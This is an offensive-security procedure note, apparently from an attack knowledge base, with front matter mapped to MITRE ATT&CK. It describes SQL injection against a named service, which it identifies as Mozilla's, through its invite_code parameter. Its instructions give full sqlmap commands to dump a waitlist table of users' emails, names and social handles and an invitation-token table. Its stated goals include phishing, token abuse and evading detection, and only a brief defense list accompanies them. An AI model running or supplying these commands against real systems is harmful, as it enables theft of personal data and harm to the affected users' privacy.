---
id: proc-uuid-4
tags:
  - data-exfiltration
  - sqli
  - postgresql
  - user-data
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-dump-waitlist]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T03:15:05.192Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Data-Exfiltration-from-Waitlist-Table

## Summary

This procedure uses SQL Injection to dump contents of specific database tables, extracting sensitive user information like emails and handles for unauthorized access and potential phishing.

## Description

Following enumeration, this targets the waitlist table in Mozilla's PostgreSQL DB via the invite_code parameter. sqlmap dumps columns such as email, first_name, last_name, mastodon_handle, and twitter_handle, revealing 9438 entries of pre-registration user data, highlighting risks of unauthenticated DB access in social platforms.

## Requirements

1. Prior schema enumeration to identify table/columns
2. sqlmap with request file and DBMS specified
3. Secure handling of dumped data to avoid detection

## Defense

Defensive measures and detection strategies:

- Encrypt sensitive DB fields and use row-level security
- Monitor for large data queries from web app connections
- Implement data loss prevention (DLP) for exfiltrated info

## Objectives

1. Extract user PII from vulnerable tables
2. Assess impact on privacy and security
3. Demonstrate full compromise potential

## Instructions

### Step 1: Dump Specific Table

**Context**: Use sqlmap to target and extract the waitlist table.

Execute [[commands/sqlmap-dump-waitlist]] (extension of enumeration command):

```bash
sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql -D public -T waitlist --dump --force-ssl
```

> Explanation: -D public -T waitlist specifies DB and table; --dump retrieves all rows.

### Step 2: Examine Invitation Tokens

**Context**: Optionally dump related tables for tokens.

```bash
sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql -D public -T invitation_tokens --dump --force-ssl
```

> Expected: Columns like assigned, assigned_at, created_at, last_name, owner, state, token; potential for token abuse.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System

### Sub-Techniques

-

## Commands Used

- [[commands/sqlmap-dump-waitlist]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- [[data-exfiltration]]
- [[user-data]]
